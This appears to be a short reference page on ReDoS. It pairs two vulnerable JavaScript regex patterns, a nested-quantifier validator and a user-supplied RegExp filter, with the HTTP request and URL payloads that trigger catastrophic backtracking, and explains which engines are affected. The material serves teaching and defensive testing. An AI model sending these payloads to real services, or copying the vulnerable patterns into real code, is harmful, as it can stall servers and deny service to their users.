# ReDoS (Regular Expression Denial of Service)

## Table of Contents

- [Denial of Service](#denial-of-service)

## Denial of Service

### A single request can keep the CPU busy for seconds or longer, and in a single-threaded runtime it blocks every other user's request. [^1]

- Triggering catastrophic backtracking in input validation
    1. Validation in the service
        ```javascript
        // The nested quantifier lets the engine split a run of letters in exponentially many ways
        const NAME = /^([a-zA-Z0-9]+\s?)*$/;

        if (!NAME.test(req.body.name)) {
            return res.status(400).send('Invalid name');
        }
        ```

    2. Request
        ```http
        POST /profile HTTP/1.1
        Host: [VULNERABLE-SERVICE]
        Content-Type: application/x-www-form-urlencoded

        name=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!
        ```
    The final `!` makes the match fail only after every way of splitting the letters has been tried, and each additional letter roughly doubles the time.

- Matching a user-supplied pattern
    1. Search in the service
        ```javascript
        const pattern = new RegExp(req.query.filter);
        const results = users.filter((user) => pattern.test(user.displayName));
        ```

    2. Request, after the attacker sets their own display name to `aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!`
        ```text
        https://[VULNERABLE-SERVICE]/users?filter=^(a%2B)%2B$
        ```

[^1]: Applies to backtracking regular expression engines, which are the default in JavaScript, Python, Java, .NET, and PCRE. Linear-time engines such as RE2 and the ones in Go and Rust are not affected.
